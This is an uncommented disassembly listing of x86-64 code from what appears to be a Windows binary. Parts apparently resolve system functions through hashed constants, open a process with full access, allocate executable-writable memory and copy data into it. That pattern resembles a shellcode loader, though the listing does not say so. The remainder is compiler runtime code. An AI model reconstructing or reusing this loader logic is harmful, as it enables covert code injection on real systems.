    6968aaba:	45 31 c0             	xor    %r8d,%r8d
    6968aabd:	48 8d 15 ca 3b 00 00 	lea    0x3bca(%rip),%rdx        # 0x6968e68e
    6968aac4:	48 89 c1             	mov    %rax,%rcx
    6968aac7:	e8 a2 d0 ff ff       	call   0x69687b6e
    6968aacc:	48 8d 0d cd a9 0e 00 	lea    0xea9cd(%rip),%rcx        # 0x697754a0
    6968aad3:	48 89 05 06 1b 10 00 	mov    %rax,0x101b06(%rip)        # 0x6978c5e0
    6968aada:	e8 b9 cc ff ff       	call   0x69687798
    6968aadf:	ba 01 00 00 00       	mov    $0x1,%edx
    6968aae4:	48 89 c1             	mov    %rax,%rcx
    6968aae7:	e8 60 d2 ff ff       	call   0x69687d4c
    6968aaec:	45 31 c9             	xor    %r9d,%r9d
    6968aaef:	45 31 c0             	xor    %r8d,%r8d
    6968aaf2:	48 8d 15 a4 3b 00 00 	lea    0x3ba4(%rip),%rdx        # 0x6968e69d
    6968aaf9:	48 89 c1             	mov    %rax,%rcx
    6968aafc:	e8 6d d0 ff ff       	call   0x69687b6e
    6968ab01:	48 89 05 98 a5 0f 00 	mov    %rax,0xfa598(%rip)        # 0x697850a0
    6968ab08:	ff 15 fa a5 0f 00    	call   *0xfa5fa(%rip)        # 0x69785108
    6968ab0e:	48 98                	cltq
    6968ab10:	48 89 05 49 9f 0f 00 	mov    %rax,0xf9f49(%rip)        # 0x69784a60
    6968ab17:	ff 15 cb a0 0f 00    	call   *0xfa0cb(%rip)        # 0x69784be8
    6968ab1d:	31 d2                	xor    %edx,%edx
    6968ab1f:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
    6968ab24:	41 89 c0             	mov    %eax,%r8d
    6968ab27:	89 05 1b a9 0f 00    	mov    %eax,0xfa91b(%rip)        # 0x69785448
    6968ab2d:	ff 15 ad 6e 0f 00    	call   *0xf6ead(%rip)        # 0x697819e0
    6968ab33:	48 8d 0d 66 a9 0e 00 	lea    0xea966(%rip),%rcx        # 0x697754a0
    6968ab3a:	48 89 05 97 1a 10 00 	mov    %rax,0x101a97(%rip)        # 0x6978c5d8
    6968ab41:	e8 52 cc ff ff       	call   0x69687798
    6968ab46:	ba 01 00 00 00       	mov    $0x1,%edx
    6968ab4b:	48 89 c1             	mov    %rax,%rcx
    6968ab4e:	e8 f9 d1 ff ff       	call   0x69687d4c
    6968ab53:	45 31 c9             	xor    %r9d,%r9d
    6968ab56:	45 31 c0             	xor    %r8d,%r8d
    6968ab59:	48 8d 15 a3 3a 00 00 	lea    0x3aa3(%rip),%rdx        # 0x6968e603
    6968ab60:	48 89 c1             	mov    %rax,%rcx
    6968ab63:	e8 06 d0 ff ff       	call   0x69687b6e
    6968ab68:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
    6968ab6e:	31 d2                	xor    %edx,%edx
    6968ab70:	4c 8b 05 09 25 00 00 	mov    0x2509(%rip),%r8        # 0x6968d080
    6968ab77:	48 8b 0d 5a 1a 10 00 	mov    0x101a5a(%rip),%rcx        # 0x6978c5d8
    6968ab7e:	48 89 05 6b 1a 10 00 	mov    %rax,0x101a6b(%rip)        # 0x6978c5f0
    6968ab85:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
    6968ab8c:	00 
    6968ab8d:	ff d0                	call   *%rax
    6968ab8f:	48 8d 0d ca a4 0e 00 	lea    0xea4ca(%rip),%rcx        # 0x69775060
    6968ab96:	ba 64 8e 4a 7a       	mov    $0x7a4a8e64,%edx
    6968ab9b:	48 89 05 be a7 0f 00 	mov    %rax,0xfa7be(%rip)        # 0x69785360
    6968aba2:	e8 73 cd ff ff       	call   0x6968791a
    6968aba7:	48 8d 0d 3a a5 0f 00 	lea    0xfa53a(%rip),%rcx        # 0x697850e8
    6968abae:	48 89 c2             	mov    %rax,%rdx
    6968abb1:	e8 e5 b7 ff ff       	call   0x6968639b
    6968abb6:	ba 6c 27 5e 67       	mov    $0x675e276c,%edx
    6968abbb:	48 8d 0d be a3 0e 00 	lea    0xea3be(%rip),%rcx        # 0x69774f80
    6968abc2:	e8 53 cd ff ff       	call   0x6968791a
    6968abc7:	48 8d 0d 12 aa 0f 00 	lea    0xfaa12(%rip),%rcx        # 0x697855e0
    6968abce:	48 89 c2             	mov    %rax,%rdx
    6968abd1:	e8 c5 b7 ff ff       	call   0x6968639b
    6968abd6:	ba 04 0f 38 25       	mov    $0x25380f04,%edx
    6968abdb:	48 8d 0d de a1 0e 00 	lea    0xea1de(%rip),%rcx        # 0x69774dc0
    6968abe2:	e8 33 cd ff ff       	call   0x6968791a
    6968abe7:	48 8d 0d 92 9c 0f 00 	lea    0xf9c92(%rip),%rcx        # 0x69784880
    6968abee:	48 89 c2             	mov    %rax,%rdx
    6968abf1:	e8 a5 b7 ff ff       	call   0x6968639b
    6968abf6:	ba e0 4d 0e 00       	mov    $0xe4de0,%edx
    6968abfb:	48 8d 0d ce 53 00 00 	lea    0x53ce(%rip),%rcx        # 0x6968ffd0
    6968ac02:	e8 43 ed ff ff       	call   0x6968994a
    6968ac07:	48 8d 0d 0a a9 0f 00 	lea    0xfa90a(%rip),%rcx        # 0x69785518
    6968ac0e:	48 89 c2             	mov    %rax,%rdx
    6968ac11:	e8 85 b7 ff ff       	call   0x6968639b
    6968ac16:	ba 4c a3 3f 1b       	mov    $0x1b3fa34c,%edx
    6968ac1b:	48 8d 0d 5e 53 00 00 	lea    0x535e(%rip),%rcx        # 0x6968ff80
    6968ac22:	e8 f3 cc ff ff       	call   0x6968791a
    6968ac27:	48 8d 0d ca 19 10 00 	lea    0x1019ca(%rip),%rcx        # 0x6978c5f8
    6968ac2e:	48 89 c2             	mov    %rax,%rdx
    6968ac31:	e8 65 b7 ff ff       	call   0x6968639b
    6968ac36:	ba a4 10 2e 31       	mov    $0x312e10a4,%edx
    6968ac3b:	48 8d 0d 9e 52 00 00 	lea    0x529e(%rip),%rcx        # 0x6968fee0
    6968ac42:	e8 d3 cc ff ff       	call   0x6968791a
    6968ac47:	48 8d 0d 72 19 10 00 	lea    0x101972(%rip),%rcx        # 0x6978c5c0
    6968ac4e:	48 89 c2             	mov    %rax,%rdx
    6968ac51:	e8 45 b7 ff ff       	call   0x6968639b
    6968ac56:	ba 2c 32 84 0f       	mov    $0xf84322c,%edx
    6968ac5b:	48 8d 0d 9e 50 00 00 	lea    0x509e(%rip),%rcx        # 0x6968fd00
    6968ac62:	e8 b3 cc ff ff       	call   0x6968791a
    6968ac67:	48 8d 0d b2 a7 0f 00 	lea    0xfa7b2(%rip),%rcx        # 0x69785420
    6968ac6e:	48 89 c2             	mov    %rax,%rdx
    6968ac71:	e8 25 b7 ff ff       	call   0x6968639b
    6968ac76:	48 8b 0d 7b 19 10 00 	mov    0x10197b(%rip),%rcx        # 0x6978c5f8
    6968ac7d:	31 d2                	xor    %edx,%edx
    6968ac7f:	48 85 c9             	test   %rcx,%rcx
    6968ac82:	74 03                	je     0x6968ac87
    6968ac84:	48 8b 11             	mov    (%rcx),%rdx
    6968ac87:	48 83 c1 10          	add    $0x10,%rcx
    6968ac8b:	e8 ba ec ff ff       	call   0x6968994a
    6968ac90:	48 8d 0d 61 9f 0f 00 	lea    0xf9f61(%rip),%rcx        # 0x69784bf8
    6968ac97:	48 89 c2             	mov    %rax,%rdx
    6968ac9a:	e8 fc b6 ff ff       	call   0x6968639b
    6968ac9f:	48 8b 05 52 9f 0f 00 	mov    0xf9f52(%rip),%rax        # 0x69784bf8
    6968aca6:	48 85 c0             	test   %rax,%rax
    6968aca9:	75 09                	jne    0x6968acb4
    6968acab:	eb 3e                	jmp    0x6968aceb
    6968acad:	31 c9                	xor    %ecx,%ecx
    6968acaf:	e8 8c 19 00 00       	call   0x6968c640
    6968acb4:	48 8b 00             	mov    (%rax),%rax
    6968acb7:	a8 0f                	test   $0xf,%al
    6968acb9:	74 30                	je     0x6968aceb
    6968acbb:	b9 10 00 00 00       	mov    $0x10,%ecx
    6968acc0:	48 99                	cqto
    6968acc2:	48 f7 f9             	idiv   %rcx
    6968acc5:	48 29 d1             	sub    %rdx,%rcx
    6968acc8:	e8 af ec ff ff       	call   0x6968997c
    6968accd:	48 8b 0d 24 9f 0f 00 	mov    0xf9f24(%rip),%rcx        # 0x69784bf8
    6968acd4:	48 89 c2             	mov    %rax,%rdx
    6968acd7:	e8 f5 eb ff ff       	call   0x696898d1
    6968acdc:	48 8d 0d 15 9f 0f 00 	lea    0xf9f15(%rip),%rcx        # 0x69784bf8
    6968ace3:	48 89 c2             	mov    %rax,%rdx
    6968ace6:	e8 b0 b6 ff ff       	call   0x6968639b
    6968aceb:	48 8b 35 06 9f 0f 00 	mov    0xf9f06(%rip),%rsi        # 0x69784bf8
    6968acf2:	31 c9                	xor    %ecx,%ecx
    6968acf4:	48 85 f6             	test   %rsi,%rsi
    6968acf7:	74 03                	je     0x6968acfc
    6968acf9:	48 8b 0e             	mov    (%rsi),%rcx
    6968acfc:	48 8b 15 15 a8 0f 00 	mov    0xfa815(%rip),%rdx        # 0x69785518
    6968ad03:	48 8d 05 36 1b 10 00 	lea    0x101b36(%rip),%rax        # 0x6978c840
    6968ad0a:	48 83 c6 10          	add    $0x10,%rsi
    6968ad0e:	48 89 c7             	mov    %rax,%rdi
    6968ad11:	f3 a4                	rep movsb (%rsi),(%rdi)
    6968ad13:	48 89 c6             	mov    %rax,%rsi
    6968ad16:	48 85 d2             	test   %rdx,%rdx
    6968ad19:	74 03                	je     0x6968ad1e
    6968ad1b:	48 8b 0a             	mov    (%rdx),%rcx
    6968ad1e:	e8 59 ec ff ff       	call   0x6968997c
    6968ad23:	48 8d 0d 56 a3 0f 00 	lea    0xfa356(%rip),%rcx        # 0x69785080
    6968ad2a:	48 89 c2             	mov    %rax,%rdx
    6968ad2d:	e8 69 b6 ff ff       	call   0x6968639b
    6968ad32:	48 8b 15 df a7 0f 00 	mov    0xfa7df(%rip),%rdx        # 0x69785518
    6968ad39:	31 c0                	xor    %eax,%eax
    6968ad3b:	48 89 35 fe 98 0f 00 	mov    %rsi,0xf98fe(%rip)        # 0x69784640
    6968ad42:	48 85 d2             	test   %rdx,%rdx
    6968ad45:	74 03                	je     0x6968ad4a
    6968ad47:	48 8b 02             	mov    (%rdx),%rax
    6968ad4a:	ba 44 fb 1a 19       	mov    $0x191afb44,%edx
    6968ad4f:	48 89 05 72 1b 10 00 	mov    %rax,0x101b72(%rip)        # 0x6978c8c8
    6968ad56:	48 8d 0d c3 4e 00 00 	lea    0x4ec3(%rip),%rcx        # 0x6968fc20
    6968ad5d:	e8 b8 cb ff ff       	call   0x6968791a
    6968ad62:	48 8d 0d ff 16 10 00 	lea    0x1016ff(%rip),%rcx        # 0x6978c468
    6968ad69:	48 89 c2             	mov    %rax,%rdx
    6968ad6c:	e8 2a b6 ff ff       	call   0x6968639b
    6968ad71:	ba 0c 8c 79 49       	mov    $0x49798c0c,%edx
    6968ad76:	48 8d 0d 43 4e 00 00 	lea    0x4e43(%rip),%rcx        # 0x6968fbc0
    6968ad7d:	e8 98 cb ff ff       	call   0x6968791a
    6968ad82:	48 8d 0d 4f fc 0e 00 	lea    0xefc4f(%rip),%rcx        # 0x6977a9d8
    6968ad89:	48 89 c2             	mov    %rax,%rdx
    6968ad8c:	e8 0a b6 ff ff       	call   0x6968639b
    6968ad91:	48 8d 0d 08 a7 0e 00 	lea    0xea708(%rip),%rcx        # 0x697754a0
    6968ad98:	e8 fb c9 ff ff       	call   0x69687798
    6968ad9d:	ba 01 00 00 00       	mov    $0x1,%edx
    6968ada2:	48 89 c1             	mov    %rax,%rcx
    6968ada5:	e8 a2 cf ff ff       	call   0x69687d4c
    6968adaa:	45 31 c9             	xor    %r9d,%r9d
    6968adad:	45 31 c0             	xor    %r8d,%r8d
    6968adb0:	48 8d 15 e6 35 00 00 	lea    0x35e6(%rip),%rdx        # 0x6968e39d
    6968adb7:	48 89 c1             	mov    %rax,%rcx
    6968adba:	e8 af cd ff ff       	call   0x69687b6e
    6968adbf:	48 8d 0d da a6 0e 00 	lea    0xea6da(%rip),%rcx        # 0x697754a0
    6968adc6:	48 89 05 03 a4 0f 00 	mov    %rax,0xfa403(%rip)        # 0x697851d0
    6968adcd:	e8 c6 c9 ff ff       	call   0x69687798
    6968add2:	ba 01 00 00 00       	mov    $0x1,%edx
    6968add7:	48 89 c1             	mov    %rax,%rcx
    6968adda:	e8 6d cf ff ff       	call   0x69687d4c
    6968addf:	45 31 c9             	xor    %r9d,%r9d
    6968ade2:	45 31 c0             	xor    %r8d,%r8d
    6968ade5:	48 8d 15 be 35 00 00 	lea    0x35be(%rip),%rdx        # 0x6968e3aa
    6968adec:	48 89 c1             	mov    %rax,%rcx
    6968adef:	e8 7a cd ff ff       	call   0x69687b6e
    6968adf4:	ba 84 6b 50 3e       	mov    $0x3e506b84,%edx
    6968adf9:	48 8d 0d e0 4c 00 00 	lea    0x4ce0(%rip),%rcx        # 0x6968fae0
    6968ae00:	48 89 05 19 1b 10 00 	mov    %rax,0x101b19(%rip)        # 0x6978c920
    6968ae07:	e8 0e cb ff ff       	call   0x6968791a
    6968ae0c:	48 8d 0d 4d fc 0e 00 	lea    0xefc4d(%rip),%rcx        # 0x6977aa60
    6968ae13:	48 89 c2             	mov    %rax,%rdx
    6968ae16:	e8 80 b5 ff ff       	call   0x6968639b
    6968ae1b:	ba cc 40 99 1c       	mov    $0x1c9940cc,%edx
    6968ae20:	48 8d 0d b9 4b 00 00 	lea    0x4bb9(%rip),%rcx        # 0x6968f9e0
    6968ae27:	e8 ee ca ff ff       	call   0x6968791a
    6968ae2c:	48 8d 0d 2d fb 0e 00 	lea    0xefb2d(%rip),%rcx        # 0x6977a960
    6968ae33:	48 89 c2             	mov    %rax,%rdx
    6968ae36:	e8 60 b5 ff ff       	call   0x6968639b
    6968ae3b:	ba 24 01 41 51       	mov    $0x51410124,%edx
    6968ae40:	48 8d 0d b9 49 00 00 	lea    0x49b9(%rip),%rcx        # 0x6968f800
    6968ae47:	e8 ce ca ff ff       	call   0x6968791a
    6968ae4c:	48 8d 0d 6d 1a 10 00 	lea    0x101a6d(%rip),%rcx        # 0x6978c8c0
    6968ae53:	48 89 c2             	mov    %rax,%rdx
    6968ae56:	e8 40 b5 ff ff       	call   0x6968639b
    6968ae5b:	ba ac cb 54 0d       	mov    $0xd54cbac,%edx
    6968ae60:	48 8d 0d 19 49 00 00 	lea    0x4919(%rip),%rcx        # 0x6968f780
    6968ae67:	e8 ae ca ff ff       	call   0x6968791a
    6968ae6c:	48 8d 0d 55 fb 0e 00 	lea    0xefb55(%rip),%rcx        # 0x6977a9c8
    6968ae73:	48 89 c2             	mov    %rax,%rdx
    6968ae76:	e8 20 b5 ff ff       	call   0x6968639b
    6968ae7b:	ba c4 9f 7c 28       	mov    $0x287c9fc4,%edx
    6968ae80:	48 8d 0d 19 48 00 00 	lea    0x4819(%rip),%rcx        # 0x6968f6a0
    6968ae87:	e8 8e ca ff ff       	call   0x6968791a
    6968ae8c:	48 8d 0d f5 18 10 00 	lea    0x1018f5(%rip),%rcx        # 0x6978c788
    6968ae93:	48 89 c2             	mov    %rax,%rdx
    6968ae96:	e8 00 b5 ff ff       	call   0x6968639b
    6968ae9b:	ba 8c 81 2f 00       	mov    $0x2f818c,%edx
    6968aea0:	48 8d 0d 79 47 00 00 	lea    0x4779(%rip),%rcx        # 0x6968f620
    6968aea7:	e8 6e ca ff ff       	call   0x6968791a
    6968aeac:	48 8d 0d 1d fb 0e 00 	lea    0xefb1d(%rip),%rcx        # 0x6977a9d0
    6968aeb3:	48 89 c2             	mov    %rax,%rdx
    6968aeb6:	e8 e0 b4 ff ff       	call   0x6968639b
    6968aebb:	ba 64 ef c8 56       	mov    $0x56c8ef64,%edx
    6968aec0:	48 8d 0d 39 47 00 00 	lea    0x4739(%rip),%rcx        # 0x6968f600
    6968aec7:	e8 4e ca ff ff       	call   0x6968791a
    6968aecc:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
    6968aed1:	ba 08 00 00 00       	mov    $0x8,%edx
    6968aed6:	4c 89 c1             	mov    %r8,%rcx
    6968aed9:	49 89 c2             	mov    %rax,%r10
    6968aedc:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
    6968aee1:	e8 e6 6a ff ff       	call   0x696819cc
    6968aee6:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
    6968aeeb:	45 31 c9             	xor    %r9d,%r9d
    6968aeee:	31 d2                	xor    %edx,%edx
    6968aef0:	4c 89 d1             	mov    %r10,%rcx
    6968aef3:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%rsp)
    6968aefa:	00 
    6968aefb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    6968af02:	00 00 
    6968af04:	e8 99 f3 ff ff       	call   0x6968a2a2
    6968af09:	48 8d 0d 50 15 10 00 	lea    0x101550(%rip),%rcx        # 0x6978c460
    6968af10:	48 89 c2             	mov    %rax,%rdx
    6968af13:	e8 83 b4 ff ff       	call   0x6968639b
    6968af18:	48 8b 0d 41 15 10 00 	mov    0x101541(%rip),%rcx        # 0x6978c460
    6968af1f:	e8 dc 6f ff ff       	call   0x69681f00
    6968af24:	48 8b 0d 35 15 10 00 	mov    0x101535(%rip),%rcx        # 0x6978c460
    6968af2b:	e8 0d e2 ff ff       	call   0x6968913d
    6968af30:	b9 0a 00 00 00       	mov    $0xa,%ecx
    6968af35:	e8 4e c5 ff ff       	call   0x69687488
    6968af3a:	48 8b 05 1f 15 10 00 	mov    0x10151f(%rip),%rax        # 0x6978c460
    6968af41:	ba 6c da 50 02       	mov    $0x250da6c,%edx
    6968af46:	48 8d 0d 93 45 00 00 	lea    0x4593(%rip),%rcx        # 0x6968f4e0
    6968af4d:	48 8b 40 28          	mov    0x28(%rax),%rax
    6968af51:	89 05 e1 a4 0f 00    	mov    %eax,0xfa4e1(%rip)        # 0x69785438
    6968af57:	e8 be c9 ff ff       	call   0x6968791a
    6968af5c:	48 8d 0d 9d 97 0f 00 	lea    0xf979d(%rip),%rcx        # 0x69784700
    6968af63:	48 89 c2             	mov    %rax,%rdx
    6968af66:	e8 30 b4 ff ff       	call   0x6968639b
    6968af6b:	48 8b 0d a6 a5 0f 00 	mov    0xfa5a6(%rip),%rcx        # 0x69785518
    6968af72:	31 d2                	xor    %edx,%edx
    6968af74:	48 85 c9             	test   %rcx,%rcx
    6968af77:	74 03                	je     0x6968af7c
    6968af79:	48 8b 11             	mov    (%rcx),%rdx
    6968af7c:	48 83 c1 10          	add    $0x10,%rcx
    6968af80:	e8 83 ec ff ff       	call   0x69689c08
    6968af85:	ba 2c 15 af 57       	mov    $0x57af152c,%edx
    6968af8a:	48 8d 0d 0f 44 00 00 	lea    0x440f(%rip),%rcx        # 0x6968f3a0
    6968af91:	e8 84 c9 ff ff       	call   0x6968791a
    6968af96:	48 8d 0d eb a5 0f 00 	lea    0xfa5eb(%rip),%rcx        # 0x69785588
    6968af9d:	48 89 c2             	mov    %rax,%rdx
    6968afa0:	e8 f6 b3 ff ff       	call   0x6968639b
    6968afa5:	90                   	nop
    6968afa6:	48 83 c4 58          	add    $0x58,%rsp
    6968afaa:	5e                   	pop    %rsi
    6968afab:	5f                   	pop    %rdi
    6968afac:	c3                   	ret
    6968afad:	e9 3b f7 ff ff       	jmp    0x6968a6ed
    6968afb2:	e9 01 d0 ff ff       	jmp    0x69687fb8
    6968afb7:	90                   	nop
    6968afb8:	90                   	nop
    6968afb9:	90                   	nop
    6968afba:	90                   	nop
    6968afbb:	90                   	nop
    6968afbc:	90                   	nop
    6968afbd:	90                   	nop
    6968afbe:	90                   	nop
    6968afbf:	90                   	nop
    6968afc0:	48 83 ec 28          	sub    $0x28,%rsp
    6968afc4:	48 8b 05 d5 20 00 00 	mov    0x20d5(%rip),%rax        # 0x6968d0a0
    6968afcb:	48 8b 00             	mov    (%rax),%rax
    6968afce:	48 85 c0             	test   %rax,%rax
    6968afd1:	74 1d                	je     0x6968aff0
    6968afd3:	ff d0                	call   *%rax
    6968afd5:	48 8b 05 c4 20 00 00 	mov    0x20c4(%rip),%rax        # 0x6968d0a0
    6968afdc:	48 8d 50 08          	lea    0x8(%rax),%rdx
    6968afe0:	48 8b 40 08          	mov    0x8(%rax),%rax
    6968afe4:	48 89 15 b5 20 00 00 	mov    %rdx,0x20b5(%rip)        # 0x6968d0a0
    6968afeb:	48 85 c0             	test   %rax,%rax
    6968afee:	75 e3                	jne    0x6968afd3
    6968aff0:	48 83 c4 28          	add    $0x28,%rsp
    6968aff4:	c3                   	ret
    6968aff5:	90                   	nop
    6968aff6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968affd:	00 00 00 
    6968b000:	56                   	push   %rsi
    6968b001:	53                   	push   %rbx
    6968b002:	48 83 ec 28          	sub    $0x28,%rsp
    6968b006:	48 8b 0d 63 aa 0e 00 	mov    0xeaa63(%rip),%rcx        # 0x69775a70
    6968b00d:	48 8b 11             	mov    (%rcx),%rdx
    6968b010:	83 fa ff             	cmp    $0xffffffff,%edx
    6968b013:	89 d0                	mov    %edx,%eax
    6968b015:	74 39                	je     0x6968b050
    6968b017:	85 c0                	test   %eax,%eax
    6968b019:	74 20                	je     0x6968b03b
    6968b01b:	89 c2                	mov    %eax,%edx
    6968b01d:	83 e8 01             	sub    $0x1,%eax
    6968b020:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
    6968b024:	48 29 c2             	sub    %rax,%rdx
    6968b027:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
    6968b02c:	0f 1f 40 00          	nopl   0x0(%rax)
    6968b030:	ff 13                	call   *(%rbx)
    6968b032:	48 83 eb 08          	sub    $0x8,%rbx
    6968b036:	48 39 f3             	cmp    %rsi,%rbx
    6968b039:	75 f5                	jne    0x6968b030
    6968b03b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x6968afc0
    6968b042:	48 83 c4 28          	add    $0x28,%rsp
    6968b046:	5b                   	pop    %rbx
    6968b047:	5e                   	pop    %rsi
    6968b048:	e9 33 63 ff ff       	jmp    0x69681380
    6968b04d:	0f 1f 00             	nopl   (%rax)
    6968b050:	31 c0                	xor    %eax,%eax
    6968b052:	eb 02                	jmp    0x6968b056
    6968b054:	89 d0                	mov    %edx,%eax
    6968b056:	44 8d 40 01          	lea    0x1(%rax),%r8d
    6968b05a:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
    6968b05f:	4c 89 c2             	mov    %r8,%rdx
    6968b062:	75 f0                	jne    0x6968b054
    6968b064:	eb b1                	jmp    0x6968b017
    6968b066:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968b06d:	00 00 00 
    6968b070:	8b 05 aa ef 0e 00    	mov    0xeefaa(%rip),%eax        # 0x6977a020
    6968b076:	85 c0                	test   %eax,%eax
    6968b078:	74 06                	je     0x6968b080
    6968b07a:	c3                   	ret
    6968b07b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6968b080:	c7 05 96 ef 0e 00 01 	movl   $0x1,0xeef96(%rip)        # 0x6977a020
    6968b087:	00 00 00 
    6968b08a:	e9 71 ff ff ff       	jmp    0x6968b000
    6968b08f:	90                   	nop
    6968b090:	41 54                	push   %r12
    6968b092:	55                   	push   %rbp
    6968b093:	57                   	push   %rdi
    6968b094:	56                   	push   %rsi
    6968b095:	53                   	push   %rbx
    6968b096:	48 83 ec 30          	sub    $0x30,%rsp
    6968b09a:	48 8b 1d 5f 20 00 00 	mov    0x205f(%rip),%rbx        # 0x6968d100
    6968b0a1:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
    6968b0a8:	2b 00 00 
    6968b0ab:	48 39 c3             	cmp    %rax,%rbx
    6968b0ae:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    6968b0b5:	00 00 
    6968b0b7:	74 17                	je     0x6968b0d0
    6968b0b9:	48 f7 d3             	not    %rbx
    6968b0bc:	48 89 1d 4d 20 00 00 	mov    %rbx,0x204d(%rip)        # 0x6968d110
    6968b0c3:	48 83 c4 30          	add    $0x30,%rsp
    6968b0c7:	5b                   	pop    %rbx
    6968b0c8:	5e                   	pop    %rsi
    6968b0c9:	5f                   	pop    %rdi
    6968b0ca:	5d                   	pop    %rbp
    6968b0cb:	41 5c                	pop    %r12
    6968b0cd:	c3                   	ret
    6968b0ce:	66 90                	xchg   %ax,%ax
    6968b0d0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6968b0d5:	ff 15 49 31 10 00    	call   *0x103149(%rip)        # 0x6978e224
    6968b0db:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
    6968b0e0:	ff 15 1e 31 10 00    	call   *0x10311e(%rip)        # 0x6978e204
    6968b0e6:	41 89 c4             	mov    %eax,%r12d
    6968b0e9:	ff 15 1d 31 10 00    	call   *0x10311d(%rip)        # 0x6978e20c
    6968b0ef:	89 c5                	mov    %eax,%ebp
    6968b0f1:	ff 15 35 31 10 00    	call   *0x103135(%rip)        # 0x6978e22c
    6968b0f7:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    6968b0fc:	89 c7                	mov    %eax,%edi
    6968b0fe:	ff 15 48 31 10 00    	call   *0x103148(%rip)        # 0x6978e24c
    6968b104:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
    6968b109:	44 89 e0             	mov    %r12d,%eax
    6968b10c:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
    6968b113:	ff 00 00 
    6968b116:	48 31 f0             	xor    %rsi,%rax
    6968b119:	89 ee                	mov    %ebp,%esi
    6968b11b:	48 31 c6             	xor    %rax,%rsi
    6968b11e:	89 f8                	mov    %edi,%eax
    6968b120:	48 31 f0             	xor    %rsi,%rax
    6968b123:	48 21 d0             	and    %rdx,%rax
    6968b126:	48 39 d8             	cmp    %rbx,%rax
    6968b129:	74 25                	je     0x6968b150
    6968b12b:	48 89 c2             	mov    %rax,%rdx
    6968b12e:	48 f7 d2             	not    %rdx
    6968b131:	48 89 05 c8 1f 00 00 	mov    %rax,0x1fc8(%rip)        # 0x6968d100
    6968b138:	48 89 15 d1 1f 00 00 	mov    %rdx,0x1fd1(%rip)        # 0x6968d110
    6968b13f:	48 83 c4 30          	add    $0x30,%rsp
    6968b143:	5b                   	pop    %rbx
    6968b144:	5e                   	pop    %rsi
    6968b145:	5f                   	pop    %rdi
    6968b146:	5d                   	pop    %rbp
    6968b147:	41 5c                	pop    %r12
    6968b149:	c3                   	ret
    6968b14a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6968b150:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
    6968b157:	d4 ff ff 
    6968b15a:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
    6968b161:	2b 00 00 
    6968b164:	eb cb                	jmp    0x6968b131
    6968b166:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968b16d:	00 00 00 
    6968b170:	55                   	push   %rbp
    6968b171:	56                   	push   %rsi
    6968b172:	53                   	push   %rbx
    6968b173:	48 89 e5             	mov    %rsp,%rbp
    6968b176:	48 83 ec 70          	sub    $0x70,%rsp
    6968b17a:	48 89 ce             	mov    %rcx,%rsi
    6968b17d:	48 8d 0d bc ee 0e 00 	lea    0xeeebc(%rip),%rcx        # 0x6977a040
    6968b184:	ff 15 d2 30 10 00    	call   *0x1030d2(%rip)        # 0x6978e25c
    6968b18a:	48 8b 1d a7 ef 0e 00 	mov    0xeefa7(%rip),%rbx        # 0x6977a138
    6968b191:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
    6968b195:	45 31 c0             	xor    %r8d,%r8d
    6968b198:	48 89 d9             	mov    %rbx,%rcx
    6968b19b:	ff 15 c3 30 10 00    	call   *0x1030c3(%rip)        # 0x6978e264
    6968b1a1:	48 85 c0             	test   %rax,%rax
    6968b1a4:	0f 84 a3 00 00 00    	je     0x6968b24d
    6968b1aa:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
    6968b1ae:	49 89 c1             	mov    %rax,%r9
    6968b1b1:	49 89 d8             	mov    %rbx,%r8
    6968b1b4:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    6968b1bb:	00 00 
    6968b1bd:	48 8d 0d 7c ee 0e 00 	lea    0xeee7c(%rip),%rcx        # 0x6977a040
    6968b1c4:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
    6968b1c9:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    6968b1cd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
    6968b1d2:	31 c9                	xor    %ecx,%ecx
    6968b1d4:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    6968b1d9:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    6968b1dd:	ff 15 89 30 10 00    	call   *0x103089(%rip)        # 0x6978e26c
    6968b1e3:	48 8b 05 4e ef 0e 00 	mov    0xeef4e(%rip),%rax        # 0x6977a138
    6968b1ea:	31 c9                	xor    %ecx,%ecx
    6968b1ec:	48 89 35 cd ee 0e 00 	mov    %rsi,0xeeecd(%rip)        # 0x6977a0c0
    6968b1f3:	48 89 05 36 f3 0e 00 	mov    %rax,0xef336(%rip)        # 0x6977a530
    6968b1fa:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
    6968b201:	00 00 00 
    6968b204:	48 89 05 15 f3 0e 00 	mov    %rax,0xef315(%rip)        # 0x6977a520
    6968b20b:	48 8b 05 ee 1e 00 00 	mov    0x1eee(%rip),%rax        # 0x6968d100
